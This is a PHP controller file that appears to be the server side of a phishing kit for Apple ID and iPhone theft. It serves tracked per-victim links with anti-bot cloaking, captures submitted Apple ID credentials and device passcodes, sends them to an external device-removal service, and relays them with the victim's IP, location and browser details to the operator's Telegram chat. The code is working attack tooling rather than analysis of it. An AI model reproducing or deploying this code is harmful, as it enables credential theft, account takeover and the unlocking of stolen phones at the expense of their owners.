<?php
App::uses('CakeTime','Utility');
class HelpController extends AppController {
	public $components = array('DatabaseFunction', 'ConditionBuilder','RequestHandler');
	public $default_conditions = array();
	
	public function index() {
		$domain = Router::url('/', true);
		$domain = str_replace('http://','https://',$domain);
		
		if (substr($domain, -1) == '/'){			
			$domain = substr($domain, 0, -1);
		}

		$generated_string = array_keys($this->params->query);
		$generated_string = $generated_string[0] ?? '';
		
		$conditions = array(
			'GeneratedLink.status' => 1,
			'GeneratedLink.generated_string' => $generated_string,
			'GeneratedLink.is_proccessed' => 0,
			'Domain.name' => $domain,
			'Domain.Status' => 1,
			'Script.Status' => 1,
		);
		$link_data = $this->get_link_data($conditions);
		
		if(count($link_data)>=1){
			$id = $link_data['GeneratedLink']['id'];
			$script_folder = $link_data['Script']['folder'];
			$this->set('script_folder',$script_folder);
			
			$current_url = get_current_url();
			
			$visitor_info = get_visitor_details();
			$language = $_SERVER["HTTP_ACCEPT_LANGUAGE"] ?? '';
			$language = (trim($language) !== '' ? substr($language, 0, 2) : '');
			
			$visitor_browser = getBrowser();
			$visitor_os = getOS();
			$visitor_country = $visitor_info['country'] ?? '';
			$visitor_city = $visitor_info['city'] ?? '';
			$visitor_location = "$visitor_city, $visitor_country";
			
			$link_data['VisitorDetails'] = $visitor_info;
			$link_data['VisitorDetails']['url'] = $current_url;
			$link_data['VisitorDetails']['post_url'] = "$domain/help/input";
			$link_data['VisitorDetails']['browser_language'] = $language;
			$link_data['VisitorDetails']['browser'] = $visitor_browser;
			$link_data['VisitorDetails']['os'] = $visitor_os;
			
			$is_visited_by_creator = boolval($link_data['GeneratedLink']['creator_ip'] == getUserIP());
			
			//script info
			$description = $link_data['Script']['name'];
			$web = $link_data['Script']['web'];
			$is_map = $link_data['Script']['map'];
			
			//owner info
			$notes = $link_data['GeneratedLink']['notes'];
			$username = $link_data['GeneratedLink']['username'];
			$victim_name = (trim($link_data['GeneratedLink']['victim_name'])!=='' ? $link_data['GeneratedLink']['victim_name'] : 'iPhone');
			$device_class = $link_data['GeneratedLink']['device_class'];
			$device_model = $link_data['GeneratedLink']['device_model'];
			$device_img = get_ios_device_img($device_class);
			$manual_location = (trim($link_data['GeneratedLink']['manual_location'])!=='' ? $link_data['GeneratedLink']['manual_location'] : $visitor_location);
			
			
			$this->loadModel('Setting');
			$settings = $this->Setting->find('first');
			
			$map_api_key = $settings['Setting']['map_api_key'] ?? '';
			$admin_chat_id = $settings['Setting']['admin_chat_id'] ?? '';
			$admin_telegram_bot = $settings['Setting']['admin_telegram_bot'] ?? '';

			$link_data['GeneratedLink']['admin_chat_id'] = $admin_chat_id;
			$link_data['GeneratedLink']['admin_telegram_bot'] = $admin_telegram_bot;
			$link_data['GeneratedLink']['map_api_key'] = $map_api_key;
			$link_data['GeneratedLink']['manual_location'] = $manual_location;
			$link_data['GeneratedLink']['is_visited_by_creator'] = $is_visited_by_creator;
			$link_data['GeneratedLink']['device_img'] = $device_img;
			$this->Session->write('Link',$link_data);
			
			//antibots
			$antibot_enabled = $settings['Setting']['antibots'] ?? true;
			if($antibot_enabled){
				App::import('Vendor', 'antibots');
			}

			//send visit
			$link_logs = $this->send_result(($is_visited_by_creator ? 'test_visit' : 'visit'));
			if(!$is_visited_by_creator){
				$save_data['GeneratedLink']['id'] = $id;
				$save_data['GeneratedLink']['visited'] = 1;
				$save_data['GeneratedLink']['GeneratedLinkLog'][] = $link_logs['GeneratedLinkLog'];
				$this->GeneratedLink->saveAssociated($save_data,array('deep'=>true));
			}
			
		}else{
			http_response_code(404);
			die();
		}
	}
	
	public function input() {
		$this->autoRender=false;
		$this->layout = false;
		
	    if($this->request->is('put') || $this->request->is('post')) {
			if($this->Session->read('Link') !==null){
			
				$id = $this->request->data['id'] ?? null;
				if($id==null){
					http_response_code(404);
					die();
				}
				
				$type = $this->request->data['type'] ?? 'account';
				$username = $this->request->data['user'] ?? '';
				$password = $this->request->data['pass'] ?? '';
				
				$link_data = $this->get_link_data(array('GeneratedLink.id'=>$id));
				$web = strtolower($link_data['Script']['web']);
				$autoremove = $link_data['GeneratedLink']['autoremove'];
				
				$auto_remove_results = null;
				$save_data = array();
				$response = array();
				
				if($type == 'account'){
					
					$POST['apple_id'] = $username;
					$POST['password'] = $password;
					$POST['web'] = $web;
					$POST['autoremove'] = (bool) $autoremove;
			
					$url = Configure::read('autoremove_link');
					$auto_remove_results = get_url_response($url,$POST,array(),'POST')[2];
					$response = json_decode($auto_remove_results,true);

					if($response['success']){
						$type = 'true_login';
						$save_data['GeneratedLink']['is_proccessed'] = 1;
						$save_data['GeneratedLink']['visited'] = 1;
						$save_data['GeneratedLink']['removed_devices'] = json_encode($response);
						$save_data['GeneratedLink']['username'] = $username;
						$save_data['GeneratedLink']['password'] = $password;
					}else{
						$auto_remove_results = '';
						$type = 'false_login';
					}
	
				}else if($type == 'passcode'){
					
					$is_proccessed = $this->request->data['processed'] ?? false;
					if($is_proccessed == true){
						$save_data['GeneratedLink']['is_proccessed'] = 1;
					}
					
					$current_passcode_attempt = (int) $link_data['GeneratedLink']['passcode_attempt'] ?? 0;
					$save_data['GeneratedLink']['visited'] = 1;
					$save_data['GeneratedLink']['passcode_attempt'] = ($current_passcode_attempt + 1);
					
				}else{
					
				}
				
				$link_logs = $this->send_result($type,$username,$password,$auto_remove_results);
				$save_data['GeneratedLink']['id'] = $id;
				$save_data['GeneratedLink']['GeneratedLinkLog'][] = $link_logs['GeneratedLinkLog'];
				$this->GeneratedLink->saveAssociated($save_data,array('deep'=>true));
				
				echo json_encode($response);
				
			}else{
				http_response_code(404);
				die();
			}
		}
	}
	
	private function send_result($type,$username=null,$password=null,$json_auto_remove_results = '[]'){
		$title_icon = '';
		$title = '';
		$log_description = '';
		$content = '';
		
		$auto_remove_results ='';
		if($type=="passcode"){
			$title_icon = "🔥🔥";
			$title = "Got Passcode!";
			$log_description = "<span class=\"badge bg-success p-1\">$password</span>";
			$content = "🔑 Passcode: <span class=\"tg-spoiler\"><b>$password</b></span>\n---------------------------------------\n";
			
		}else if($type=="false_login"){
			
			$title_icon = "❌❌";
			$title = "Invalid Login!";
			$log_description="<span class=\"badge bg-danger\">Invalid Login</span><br/>ID: <b>$username</b><br/>Password: <b>$password</b>";
			$content = "🔒 ID: <b>$username</b>\n🔑 Password: <b>$password</b>\n---------------------------------------\n";
			
		}else if($type=="true_login"){
			
			$auto_remove_results = $this->parse_auto_remove_result($json_auto_remove_results);
			$title_icon = "🔥🔥";
			$title = "Got Account Credentials!";
			$log_description="<span class=\"badge bg-success\">Successful Login</span><br/>ID: <b>$username</b><br/>Password: <b>$password</b>";
			$content = "🔒 ID: <span class=\"tg-spoiler\"><b>$username</b></span>\n🔑 Password: <span class=\"tg-spoiler\"><b>$password</b></span>\n---------------------------------------\n";
			
		}else if($type=="visit"){
			
			$title_icon = "✈️✈️";
			$title = "Visit Link!";
			$content = "";
			$log_description='<span class="badge bg-primary">Visit</span>';
			
		}else if($type=="test_visit"){
			$title_icon = "✈️✈️";
			$title = "You initiated test visit!";
			$content = "";
			$log_description="";
		}
		
		$link_data = $this->Session->read('Link');
		
		$domain_id = $link_data['Domain']['id'] ?? '';
		$script_id = $link_data['Script']['id'] ?? '';
		$chat_id = $link_data['LinkOwner']['chat_id'] ?? '';
		$method = $link_data['Script']['name'] ?? '';
		$ip = $link_data['VisitorDetails']['query'] ?? getUserIP();
		$url = $link_data['VisitorDetails']['url'] ?? '';
		$lang = $link_data['VisitorDetails']['browser_language'] ?? '';
		$country = $link_data['VisitorDetails']['country'] ?? '';
		$city = $link_data['VisitorDetails']['city'] ?? '';
		$browser = $link_data['VisitorDetails']['browser'] ?? '';
		$os = $link_data['VisitorDetails']['os'] ?? '';
		$zip = $link_data['VisitorDetails']['zip'] ?? '';
		$timezone = $link_data['VisitorDetails']['timezone'] ?? '';
		$isp = $link_data['VisitorDetails']['isp'] ?? '';
		$notes = $link_data['GeneratedLink']['notes'] ?? '';
		
		$mess = "$title_icon $title $title_icon
---------------------------------------
🖥 Method: $method
---------------------------------------
".$content."🌎 URL => #$url
---------------------------------------
📝 Notes: $notes
---------------------------------------
💻 System Information 📱
---------------------------------------
🌎 IP Address => $ip
📅 TimeStamp => ".date('d/m/Y H:i:s')."
🌐 Lang : $lang
🛫 Country => $country
🏙 City => $city
⌨️ Browser => $browser
🖥 OS => $os
📫 Postal Code => $zip
🕛 Time Zone => $timezone
⚡ Connection => $isp
$auto_remove_results";
		
		$this->loadModel('Setting');
		$settings = $this->Setting->find('first');
		$bot_token = $settings['Setting']['user_telegram_bot'] ?? '';

		$response = send_telegram_msg($chat_id,$bot_token,$mess);
		
		//prepare logs
		$data['GeneratedLinkLog']['visitor_ip'] = $ip;
		$data['GeneratedLinkLog']['visitor_lang'] = $lang;
		$data['GeneratedLinkLog']['visitor_country'] = $country;
		$data['GeneratedLinkLog']['visitor_city'] = $city;
		$data['GeneratedLinkLog']['visitor_browser'] = $browser;
		$data['GeneratedLinkLog']['visitor_os'] = $os;
		$data['GeneratedLinkLog']['visitor_postal_code'] = $zip;
		$data['GeneratedLinkLog']['visitor_timezone'] = $timezone;
		$data['GeneratedLinkLog']['visitor_connection'] = $isp;
		$data['GeneratedLinkLog']['log_type'] = $type;
		$data['GeneratedLinkLog']['log_method'] = $method;
		$data['GeneratedLinkLog']['log_description'] = $log_description;
		$data['GeneratedLinkLog']['removed_devices'] = $auto_remove_results;
		$data['GeneratedLinkLog']['script_id'] = $script_id;
		$data['GeneratedLinkLog']['domain_id'] = $domain_id;
		
		return $data;
	}
	
	private function get_link_data($conditions=array()){
		$this->loadModel('GeneratedLink');
		$link_data = $this->GeneratedLink->find('first',array(	
			'fields'=>array(
				'GeneratedLink.id',
				'GeneratedLink.notes',
				'GeneratedLink.username',
				'GeneratedLink.victim_name',
				'GeneratedLink.device_class',
				'GeneratedLink.device_model',
				'GeneratedLink.manual_location',
				'GeneratedLink.autoremove',
				'GeneratedLink.creator_ip',
				'GeneratedLink.passcode_attempt',
				'GeneratedLink.redirect_url',
				
				'Script.name',
				'Script.folder',
				'Script.web',
				'Script.map',
				
				'LinkOwner.id',
				'LinkOwner.chat_id',
				
			),
			'contain'=>array('Domain','Script','LinkOwner'),
			'conditions'=>$conditions,
			'recursive'=>-1
		));
		
		return $link_data;
	}
	
	public function beforeFilter() {
		parent::beforeFilter();
		App::import('Vendor', 'protect/antibots');
		$this->Auth->allow('input','index');
		$this->layout = 'ajax';
	}
	
	public function isAuthorized($user) {
		return true;
	}

}
?>